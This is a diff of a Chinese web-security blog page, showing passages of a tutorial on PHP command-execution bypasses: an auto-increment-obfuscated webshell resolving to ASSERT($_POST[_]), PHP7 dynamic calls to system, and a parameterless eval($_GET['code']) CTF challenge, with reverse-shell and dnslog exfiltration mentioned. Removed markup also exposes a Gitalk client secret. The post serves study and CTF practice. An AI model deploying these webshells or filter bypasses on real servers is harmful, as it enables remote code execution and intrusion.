+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">"<span class="subst">$_</span>"</span>; <span class="comment">// $_='Array';</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">'!'</span>==<span class="string">'@'</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E</span></span><br><span class="line"> <span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R$___.=$__;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T$___.=$__;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">'_'</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P$____.=$__;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O$____.=$__;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S$____.=$__;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T$____.=$__;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>在php7中，我们可以使用($a)()这种方法来执行命令，如(call_user_func)(system,whoami,’’)</p>
 <p>php7特性</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token string single-quoted-string">'var_dump'</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1111'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token punctuation">(</span><span class="token string double-quoted-string">"VAR_DUMP"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"llll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
- <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>ss<span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br/&gt;'</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'_GET'</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`pwd`</span><span class="token punctuation">;</span></span></code></pre>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="string">'var_dump'</span>(<span class="string">'1111'</span>);</span><br><span class="line"> (<span class="string">"VAR_DUMP"</span>)(<span class="string">"llll"</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$_GET</span>[ss];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">'1'</span>] . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="string">'_GET'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">echo</span> `pwd`;</span><br></pre></td></tr></tbody></table></figure>
 
 <p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p>
 <h3 id="4-临时文件"><a href="#4-临时文件" class="headerlink" title="4.临时文件"></a>4.<strong>临时文件</strong></h3><p>利用通配符</p>
@@ -619,22 +367,11 @@ http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre>
 <p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p>
 <p>成功执行任意命令。</p>
 <h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
-<h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
- <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
+<h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[<span class="string">'code'</span>])) { </span><br><span class="line"> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">'code'</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b('111'));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p>
 <h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
-<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
- <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
-<span class="token keyword">else</span>
- <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
-<span class="token keyword">else</span>
- <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'please input code'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?&gt;</span></span> </code></pre>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'code'</span>])){</span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[<span class="string">'code'</span>])) { </span><br><span class="line"> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">'code'</span>]);}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> <span class="keyword">die</span>(<span class="string">'nonono'</span>);}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> <span class="keyword">echo</span>(<span class="string">'please input code'</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></tbody></table></figure>
 
 <p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y2OTE1NzVjMzBkZGZiZGY1MzZmODY0ODk4OWNjMWFfOXQ1SnRDZ1NqTVJSaWZvOEJMZDNDYmxJSlV0SFlHNTFfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p>
 <p>image.png</p>
@@ -704,688 +441,490 @@ http://localhost:2500/codeexec.php?chybeta=phpinfo</code></pre>
 <p>作为命令的分隔符，然后发起<code>curl</code>请求，然后最后用反引号执行命令</p>
 <h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><p>特定情况下压缩flag文件,并访问</p>
 
-                
-            </div>
-            <hr/>
-
-            
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                                    <span class="chip bg-color">web安全</span>
-                                </a>
-                            
-                                <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
-                                    <span class="chip bg-color">基础漏洞</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-<div id="article-share">
-
-    
-    <div class="social-share" data-sites="qq,wechat,weibo,twitter,facebook" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
-</div>
-
-                </div>
-            </div>
-            
-        </div>
+      
     </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/" rel="tag">基础漏洞</a></li></ul>
 
+
+    </footer>
+  </div>
+  
     
-        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
-<link rel="stylesheet" href="/css/my-gitalk.css">
-
-<div class="card gitalk-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="https://yyjccc.github.io/images/cover/5.png" data-sizes="auto" alt="sql注入漏洞总结" class="lazyload">
+          
+        
+        <a href="/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            sql注入漏洞总结
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://yyjccc.github.io/images/cover/3.png" data-sizes="auto" alt="JavaScript的原型链污染" class="lazyload">
+        
+      
+      <a href="/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          JavaScript的原型链污染
+        
+      </h3>
     </div>
-    <div id="gitalk-container" class="card-content"></div>
-</div>
-
-<script src="/libs/gitalk/gitalk.min.js"></script>
-<script>
-    let gitalk = new Gitalk({
-        clientID: '0efb4a442bc09d1ba17e',
-        clientSecret: 'd26f520fef841de4f4388029a0d5c0f4730357cf',
-        repo: 'yyjccc.github.io',
-        owner: 'Yyjccc',
-        admin: "Yyjccc",
-        id: '2023-08-05T23-34-41',
-        distractionFreeMode: false  // Facebook-like distraction free mode
-    });
-
-    gitalk.render('gitalk-container');
-</script>
-
     
+  </nav>
 
-    
 
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/2023/08/23/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-mysql/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="sql注入漏洞总结">
-                        
-                        <span class="card-title">sql注入漏洞总结</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-23
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Yyjccc
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
-                        <span class="chip bg-color">基础漏洞</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/07/26/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="JavaScript的原型链污染">
-                        
-                        <span class="card-title">JavaScript的原型链污染</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-26
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Yyjccc
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">web安全</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-    </div>
+  
 </article>
 
+
+
+
+  <div id="comments" class="gtcomment"></div>
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">命令执行漏洞（RCE）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">相关函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash"><span class="toc-number">1.2.</span> <span class="toc-text">Bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF-%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">WAF****绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.3.1.</span> <span class="toc-text">常见的替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">1.3.2.</span> <span class="toc-text">通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-number">1.3.3.</span> <span class="toc-text">连接符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.4.</span> <span class="toc-text">正则表达式绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">黑名单绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D-%E6%95%B0%E5%AD%97-RCE"><span class="toc-number">1.4.</span> <span class="toc-text">无字母(数字)RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BC%82%E6%88%96"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.异或 ^</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%96%E5%8F%8D"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.取反 ~</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%87%AA%E5%A2%9E"><span class="toc-number">1.4.3.</span> <span class="toc-text">3.自增</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.4.</span> <span class="toc-text">4.临时文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-number">1.5.</span> <span class="toc-text">无参数RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81"><span class="toc-number">1.6.</span> <span class="toc-text">核心代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-getallheaders"><span class="toc-number">1.7.</span> <span class="toc-text">1.getallheaders()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-get-defined-vars"><span class="toc-number">1.8.</span> <span class="toc-text">2.get_defined_vars()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-session-id"><span class="toc-number">1.9.</span> <span class="toc-text">3.session_id()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-php%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.10.</span> <span class="toc-text">4.php函数直接读取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-localeconv"><span class="toc-number">1.10.1.</span> <span class="toc-text">1.localeconv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-scandir"><span class="toc-number">1.10.2.</span> <span class="toc-text">2.scandir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-current-pos"><span class="toc-number">1.10.3.</span> <span class="toc-text">3.current(pos)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-chdir"><span class="toc-number">1.10.4.</span> <span class="toc-text">4.chdir()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-array-reverse"><span class="toc-number">1.10.5.</span> <span class="toc-text">5.array_reverse()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-highlight-file"><span class="toc-number">1.10.6.</span> <span class="toc-text">6.highlight_file()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">1.11.</span> <span class="toc-text">无回显RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.11.0.1.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dnslog"><span class="toc-number">1.11.0.2.</span> <span class="toc-text">dnslog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.11.0.3.</span> <span class="toc-text">文件下载</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
 </div>
-
-
-
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
-
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
-
-
-<!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Yyjccc" class="lazyload">
+  <div class="sidebar-author-name">Yyjccc</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">42</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">64</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Yyjccc itemprop="url" target="_blank" aria-label="github"></a>
     </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget card" style="background-color: white;">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
